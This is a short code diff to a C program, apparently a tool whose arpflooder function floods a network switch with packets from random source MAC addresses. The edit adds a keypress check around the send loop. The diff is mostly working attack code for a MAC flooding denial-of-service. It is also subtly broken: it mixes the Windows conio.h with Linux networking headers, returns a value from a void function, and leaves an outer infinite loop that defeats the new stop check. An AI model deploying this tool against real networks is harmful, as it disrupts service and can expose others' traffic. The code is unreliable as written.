@@ -81,6 +81,7 @@
 #include <stdarg.h>
 #include <limits.h>
 #include <ctype.h>
+#include <conio.h>
 #include "parser.h"
 
 #include <netinet/if_ether.h>
@@ -133,19 +134,23 @@ void arpflooder()
    // Flood the switch with packets
    printf("Flooding switch...\n");
    while (1) {
-      // Generate a random source MAC address
-      for (i = 0; i < ETH_ALEN; i++) {
-         eth_hdr->ether_shost[i] = rand() % 256;
-      }
+      while(!kbhit())
+      {
+         // Generate a random source MAC address
+         for (i = 0; i < ETH_ALEN; i++) {
+            eth_hdr->ether_shost[i] = rand() % 256;
+         }
 
-      // Send the packet
-      if (send(sock, buffer, PKT_SIZE, 0) < 0) {
-         perror("send() failed");
-         return 1;
-      }
+         // Send the packet
+         if (send(sock, buffer, PKT_SIZE, 0) < 0) {
+            perror("send() failed");
+            return 1;
+         }
 
-      // Sleep for a short time to avoid overwhelming the switch
-      usleep(10000);
+         // Sleep for a short time to avoid overwhelming the switch
+         usleep(10000);
+      }
+      getch();
    }
 
    return 0;
